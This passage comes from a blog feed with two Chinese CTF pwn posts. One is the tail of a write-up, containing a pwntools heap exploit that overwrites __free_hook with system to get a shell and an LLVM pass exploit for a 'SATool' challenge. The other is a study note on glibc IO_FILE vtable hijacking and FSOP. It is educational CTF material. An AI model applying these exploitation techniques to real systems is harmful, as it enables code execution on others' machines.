#fmyy</span><br><span class="line">UnRegister(p64(heap_base + 0x3A0) + &#x27;\x00&#x27;*0x10 + p64(0x121) + p64(heap_base + 0x2F0))</span><br><span class="line"></span><br><span class="line">UnRegister(&#x27;0&#x27;)</span><br><span class="line">UnRegister(&#x27;1&#x27;)</span><br><span class="line"></span><br><span class="line">Write(&#x27;TMP&#x27;,0x60,&#x27;\xF0&#x27;)</span><br><span class="line">Read(&#x27;TMP&#x27;)</span><br><span class="line">libc_base = (u32(p.recv(3).ljust(4,&#x27;\x00&#x27;)) | 0x0000004000000000) - 0x16DEF0</span><br><span class="line">log.info(&#x27;LIBC:\t&#x27; + hex(libc_base))</span><br><span class="line">Write(&#x27;3&#x27;,0x170,&#x27;FMYY&#x27;)</span><br><span class="line">Write(&#x27;3&#x27;,0x200,&#x27;\x00&#x27;*0x150 + p64(libc_base + libc.sym[&#x27;__free_hook&#x27;]))</span><br><span class="line"></span><br><span class="line">Write(&#x27;3&#x27;,0x110,&#x27;FMYY&#x27;)</span><br><span class="line">Write(&#x27;3&#x27;,0x110,p64(libc_base + libc.sym[&#x27;system&#x27;]))</span><br><span class="line"></span><br><span class="line">UnRegister(&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="SATool"><a href="#SATool" class="headerlink" title="SATool"></a>SATool</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">// clang -emit-llvm -o test.bc -c code.c</span><br><span class="line">/*</span><br><span class="line">run:        call *0x2040F8()</span><br><span class="line">stealkey:   0x204100 = *0x2040F8</span><br><span class="line">takeaway:   clear the 0x2040F8</span><br><span class="line">save(char *s1,char *s2):</span><br><span class="line">    memcpy(&amp;P[0],s1,strlen(s1));</span><br><span class="line">    memcpy(&amp;P[1],s2,strlen(s2));</span><br><span class="line">fakekey:    set *0x2040F8 = 0x204100 + SetEXTValue</span><br><span class="line">*/</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int B4ckDo0r()</span><br><span class="line">&#123;</span><br><span class="line">        save(&quot;FMYY&quot;,&quot;FMYY&quot;);</span><br><span class="line">        save(&quot;FMYY&quot;,&quot;FMYY&quot;);</span><br><span class="line">        save(&quot;FMYY&quot;,&quot;FMYY&quot;);</span><br><span class="line">        save(&quot;FMYY&quot;,&quot;FMYY&quot;);</span><br><span class="line">        save(&quot;FMYY&quot;,&quot;FMYY&quot;);</span><br><span class="line">        save(&quot;\x00&quot;,&quot;FMYY&quot;);</span><br><span class="line">        stealkey();</span><br><span class="line">        fakekey(-0x2E1884);</span><br><span class="line">        run();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">int run()</span><br><span class="line">&#123;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">int save(char *s1,char *s2)</span><br><span class="line">&#123;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">int fakekey(int64)</span><br><span class="line">&#123;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">int takeaway(char *s1)</span><br><span class="line">&#123;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    B4ckDo0r();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://ctf.njupt.edu.cn/613.html#silverwolf">https://ctf.njupt.edu.cn/613.html#silverwolf</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;第一次单独做正式比赛的pwn，比赛时看到题还是挺懵的一道题没做出来，赛后又看了下几道pwn题的wp，写本篇记录下看的那几道pwn题，虽然事后看了wp感觉题的确不算难但是估计明年再自己做还是挺困难。&lt;/p&gt;</summary>
    
    
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>IO_FILE</title>
    <link href="http://example.com/2021/06/05/IO-FILE/"/>
    <id>http://example.com/2021/06/05/IO-FILE/</id>
    <published>2021-06-05T06:38:20.000Z</published>
    <updated>2021-06-07T12:09:35.086Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>一篇关于IO_FILE学习的笔记，因为作者这部分刚看所以记录的知识比较肤浅，大部分是作者自己的推测和理解，如果哪里错了请大佬看到轻喷。</p><span id="more"></span><h2 id="IO-FILE结构"><a href="#IO-FILE结构" class="headerlink" title="IO_FILE结构"></a>IO_FILE结构</h2><p>当Linux系统上的程序运行时会使用fopen函数创建FILE结构将其分配在堆中对文件进行处理，FILE是Linux系统标准IO库中专门用于描述文件结构的文件流，它是结构体会记录与文件操作有关的相关变量，每个要处理的文件本质上就是一个FILE，有3个文件流是程序启动时就自动准备好的，分别是stdin、stdout、stderr，此外所有FILE文件流又通过_chain链接成一条链表，表头通过_IO_list_all(libc全局变量，在符号表中可通过pwntools找到)指向(一般它指向IO_2_1_stderr)，通过_IO_list_all就可以控制所有的FILE文件流，这里可以看一张大佬的图片方便理解：</p><p><img src="/2021/06/05/IO-FILE/assets%5Cimg%5Cimage1.png" alt="image-20210527174147620"></p><p>下面具体说一下，先看一张图：</p><p><img src="/2021/06/05/IO-FILE/%5Cassets%5Cimg%5Cimage2.png" alt="image-20210527160050312"></p><p>首先看一下_IO_FILE_plus，它是一个结构体，当打开一个文件时都会从堆上分配内存来存放它：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_FILE_plus</span><br><span class="line">&#123;</span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  const struct _IO_jump_t *vtable;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>file是Linux 系统标准IO库中描述文件的结构，即最上面说的FILE文件流，实际上是一个结构体，file结构在程序执行fread、fwrite等标准函数时需要文件流指针去调用虚表函数，fopen等函数时会进行创建并分配在堆中，通常可以定义一个指向file结构的指针来接收这个返回值。</p><p>下面是_IO_FILE的结构，_chain链接的即是该部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_FILE &#123;</span><br><span class="line">  int _flags;           /属性标志，由fopen的mode参数决定，高2位字节标志文件，低2位标志程序执行状态/</span><br><span class="line">#define _IO_file_flags _flags</span><br><span class="line"></span><br><span class="line">  /* The following pointers correspond to the C++ streambuf protocol. */</span><br><span class="line">  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span><br><span class="line">  char* _IO_read_ptr;   /* Current read pointer */</span><br><span class="line">  char* _IO_read_end;   /* End of get area. */</span><br><span class="line">  char* _IO_read_base;  /* Start of putback+get area. */</span><br><span class="line">  char* _IO_write_base; /* 起始输入地址 */</span><br><span class="line">  char* _IO_write_ptr;  /* Current put pointer. */</span><br><span class="line">  char* _IO_write_end;  /* 输入结束地址 */</span><br><span class="line">  char* _IO_buf_base;   /* 操作起始地址 */</span><br><span class="line">  char* _IO_buf_end;    /* 操作结束地址 */</span><br><span class="line">  /*控制 _IO_buf_base 和 _IO_buf_end就可以实现任意读写*/</span><br><span class="line">  /* The following fields are used to support backing up and undo. */</span><br><span class="line">  char *_IO_save_base; /* Pointer to start of non-current get area. */</span><br><span class="line">  char *_IO_backup_base;  /* Pointer to first valid character of backup area */</span><br><span class="line">  char *_IO_save_end; /* Pointer to end of non-current get area. */</span><br><span class="line"></span><br><span class="line">  struct _IO_marker *_markers;</span><br><span class="line"></span><br><span class="line">  struct _IO_FILE *_chain;</span><br><span class="line"></span><br><span class="line">  int _fileno;</span><br><span class="line">#if 0</span><br><span class="line">  int _blksize;</span><br><span class="line">#else</span><br><span class="line">  int _flags2;</span><br><span class="line">#endif</span><br><span class="line">  _IO_off_t _old_offset; /* This used to be _offset but it&#x27;s too small.  */</span><br><span class="line"></span><br><span class="line">#define __HAVE_COLUMN /* temporary */</span><br><span class="line">  /* 1+column number of pbase(); 0 is unknown. */</span><br><span class="line">  unsigned short _cur_column;</span><br><span class="line">  signed char _vtable_offset;</span><br><span class="line">  char _shortbuf[1];</span><br><span class="line"></span><br><span class="line">  /*  char* _save_gptr;  char* _save_egptr; */</span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line">#ifdef _IO_USE_OLD_IO_FILE</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>再看一下_IO_jump_t，它是一个虚表指针，即vtable虚拟函数表(vtable保存标准流函数底层调用的函数指针，32位偏移FILE结构0x94，64位偏移FILE结构0xd8)，通过它指向FILE会使用的函数。因为有很多函数都调用其中的子函数，无论是关闭文件，还是报错输出等都有对应的字段，所以攻击者可以通过伪造这部分劫持程序流，伪造vtable可以通过任意地址写直接修改vtable中的函数指针或覆写vtable的指针指向可控的内存：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_jump_t</span><br><span class="line">&#123;</span><br><span class="line">    JUMP_FIELD(size_t, __dummy);</span><br><span class="line">    JUMP_FIELD(size_t, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    /* showmany */</span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">#if 0</span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line">#endif</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><p>因为作者比较懒所以不说例题了，直接记一下关于IO_FILE利用的思路。</p><p>第一种利用方式是可以通过_IO_2_1stdout泄露libc地址，具体步骤有很多，大多是使用堆来控制_IO_2_1stdout来泄露libc，比如修改_IO_2_1stdout的_IO_write_base，之后调用puts或printf时即可泄露出_IO_write_base~_IO_write_ptr间的数据。要满足的条件有：</p><p>1、设置_flags &amp; _IO_NO_WRITES = 0</p><p>2、设置_flags &amp; _IO_CURRENTLY_PUTTING = 1</p><p>3、设置_flags &amp; _IO_IS_APPENDING = 1</p><p>4、设置_IO_write_base指向想要泄露的位置，_IO_write_ptr指向泄露结束的地址</p><p>具体原理去看参考的第4条链接吧，大佬讲的太清楚不好意思复制粘贴了。</p><p>第二种是伪造vtable劫持程序流程，因为Linux程序中的IO操作一般都需要通过FILE进行处理，而FILE调用函数进行处理时又是通过vtable指向被调用的函数，因此如果能够伪造vtable结构使其指向受控内存就能控制程序流程，vtable劫持可以通过任意地址写直接改写vtable中的函数指针，通过覆盖vtable指针使其指向受控内存，或者直接伪造整个FILE结构。具体说下上面三种伪造方法：</p><p>先看一下IO函数会使用vtable的哪个函数：</p><p>1、fread函数调用_IO_FILE_plus.vtable中的_IO_XSGETN指针<br>2、fwrite函数调用_IO_FILE_plus.vtable中的_IO_XSPUTN指针，_IO_XSPUTN中会调用同样位于 vtable 中的_IO_OVERFLOW指针<br>3、fclose函数调用_IO_FILE_plus.vtable中的_IO_FINISH指针<br>4、printf/puts与fwrite函数调用大致相同，均会调用_IO_XSPUTN指针和_IO_OVERFLOW指针</p><p>先是通过任意地址写直接改写vtable中的函数指针，上面的这些指针都可以去vtable表中查找偏移，找到要使用的函数和偏移后对函数指针进行修改即可，比如将XSPUTN指针指向system函数，将_IO_FILE_plus头部的内容改为sh，之后fwrite函数中调用xsputn时实际运行system(“sh”)。</p><p>之后是覆盖vtable指针指向受控内存，因为一般情况下vtable无法进入也就无法修改里面的函数指针所以第一种方法并不是很实用，再说下第二种伪造vtable即改写_IO_FILE_plus的vtable指针指向可控内存，在可控内存中布置fake_vtable，之后去指向在fake_vtable中伪造的函数就可以实现程序控制。</p><p>最后一个是伪造FILE结构，比如一个正常的FILE是这样的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">gef➤  p  *(struct _IO_FILE_plus *) stdout</span><br><span class="line">$2 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 0xfbad2887, </span><br><span class="line">    _IO_read_ptr = 0x7f5b6742a6a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_read_end = 0x7f5b6742a6a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_read_base = 0x7f5b6742a6a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_write_base = 0x7f5b6742a6a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_write_ptr = 0x7f5b6742a6a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_write_end = 0x7f5b6742a6a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_buf_base = 0x7f5b6742a6a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_buf_end = 0x7f5b6742a6a4 &lt;_IO_2_1_stdout_+132&gt; &quot;&quot;, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x7f5b674298e0 &lt;_IO_2_1_stdin_&gt;, </span><br><span class="line">    _fileno = 0x1, </span><br><span class="line">    _flags2 = 0x0, </span><br><span class="line">    _old_offset = 0xffffffffffffffff, </span><br><span class="line">    _cur_column = 0x0, </span><br><span class="line">    _vtable_offset = 0x0, </span><br><span class="line">    _shortbuf = &quot;\n&quot;, </span><br><span class="line">    _lock = 0x7f5b6742b780 &lt;_IO_stdfile_1_lock&gt;, </span><br><span class="line">    _offset = 0xffffffffffffffff, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x7f5b674297a0 &lt;_IO_wide_data_1&gt;, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0x0, </span><br><span class="line">    _mode = 0xffffffff, </span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7f5b674286e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要想伪造FILE需要绕过_flags的检查，同时满足flag&amp;8=0、flag &amp;2 =0、flag &amp; 0x8000 != 0，所以flag的值可以为0xfbad8000或者0xfbad8080。其他的结构按照之前的伪造即可，伪造后的FILE是这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">gef➤  p *(struct _IO_FILE_plus *)0x602090</span><br><span class="line">$1 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 0xfbad8000, </span><br><span class="line">    _IO_read_ptr = 0x602060 &quot;  `&quot;, </span><br><span class="line">    _IO_read_end = 0x602060 &quot;  `&quot;, </span><br><span class="line">    _IO_read_base = 0x602060 &quot;  `&quot;, </span><br><span class="line">    _IO_write_base = 0x602060 &quot;  `&quot;, </span><br><span class="line">    _IO_write_ptr = 0x602060 &quot;  `&quot;, </span><br><span class="line">    _IO_write_end = 0x602060 &quot;  `&quot;, </span><br><span class="line">    _IO_buf_base = 0x602060 &quot;  `&quot;, </span><br><span class="line">    _IO_buf_end = 0x602061 &quot; `&quot;, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x602060, </span><br><span class="line">    _fileno = 0x1, </span><br><span class="line">    _flags2 = 0x0, </span><br><span class="line">    _old_offset = 0xffffffffffffffff, </span><br><span class="line">    _cur_column = 0x0, </span><br><span class="line">    _vtable_offset = 0x0, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x602060, </span><br><span class="line">    _offset = 0xffffffffffffffff, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x602060, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0x0, </span><br><span class="line">    _mode = 0xffffffff, </span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x6021c8</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第三种是FSOP，它是file stream oriented  programing的缩写，一个进程内所有的_IO_FILE使用_chain相互连接形成一个链表，而链表头部是_IO_list_all，FSOP即是劫持_IO_list_all伪造链表和其中的_IO_FILE项，伪造数据劫持后并不会直接去执行还需要触发，调用_IO_flush_all_lockp可以触发FSOP，这个函数会刷新_IO_list_all链表中所有项的文件流，相当于对每个FILE调用fflush，也对应着会调用_IO_FILE_plus.vtable中的_IO_overflow。</p><p>IO_flush_all_lockp源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">_IO_flush_all_lockp (int do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  int result = 0;</span><br><span class="line">  FILE *fp;</span><br><span class="line">#ifdef _IO_MTSAFE_IO</span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);</span><br><span class="line">#endif</span><br><span class="line">  for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      if (do_lock)</span><br><span class="line">        _IO_flockfile (fp);</span><br><span class="line">      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)/*一些检查，需要绕过*/</span><br><span class="line">           || (_IO_vtable_offset (fp) == 0</span><br><span class="line">               &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))/*也可以绕过这个*/</span><br><span class="line">           )</span><br><span class="line">          &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)/*遍历_IO_list_all ，选出_IO_FILE作为_IO_OVERFLOW的参数，执行函数*/</span><br><span class="line">        result = EOF;</span><br><span class="line">      if (do_lock)</span><br><span class="line">        _IO_funlockfile (fp);</span><br><span class="line">      run_fp = NULL;</span><br><span class="line">    &#125;</span><br><span class="line">#ifdef _IO_MTSAFE_IO</span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (0);</span><br><span class="line">#endif</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>想要使用_IO_flush_all_lockp触发FSOP可以使用以下方法，第2、3种方法一般最常用：</p><p>1、当libc执行abort流程时abort会触发malloc_printerr触发FSOP<br>2、当执行exit函数时<br>3、当执行流从main函数返回时</p><p>FSOP攻击的前提条件：</p><p>1、知道libc地址获取_IO_lsit_all地址</p><p>2、可以任意地址写修改 _IO_list_all为可控地址</p><p>3、可以在可控内存中伪造_IO_FILE_plus结构</p><p>第3条中要想让伪造的fake_FILE需要满足一个条件：</p><p>1、fp-&gt;_mode &lt;= 0<br>2、fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</p><p>glibc2.24后增加了对劫持vtable的检测，glibc会在调用虚函数之前首先检查vtable地址的合法性。首先会验证vtable是否位于_IO_vtable段中，如果满足条件就正常执行，否则会调用_IO_vtable_check做进一步检查。</p><p>未完待续。。。。。。。</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>关于IO_FILE这部分知识太多了，仅仅只是pwn部分关于IO_FILE的利用方式就不仅只有上面3种利用方式，还有任意地址读写、利用stream_buffer等利用方法，但还没看，最近只是简单看了下IO_FILE原理和利用方法，还没有去做题实践，以后有时间会再次补充下上面的内容。</p><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://ctf-wiki.org/pwn/linux/io_file/introduction/">https://ctf-wiki.org/pwn/linux/io_file/introduction/</a></p><p><a href="https://ctf-wiki.org/pwn/linux/io_file/fake-vtable-exploit/">https://ctf-wiki.org/pwn/linux/io_file/fake-vtable-exploit/</a></p><p><a href="https://ctf-wiki.org/pwn/linux/io_file/fsop/">https://ctf-wiki.org/pwn/linux/io_file/fsop/</a></p><p><a href="https://blog.csdn.net/qq_41202237/article/details/113845320">https://blog.csdn.net/qq_41202237/article/details/113845320</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;一篇关于IO_FILE学习的笔记，因为作者这部分刚看所以记录的知识比较肤浅，大部分是作者自己的推测和理解，如果哪里错了请大佬看到轻喷。&lt;/p&gt;</summary>
    
    
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
</feed>
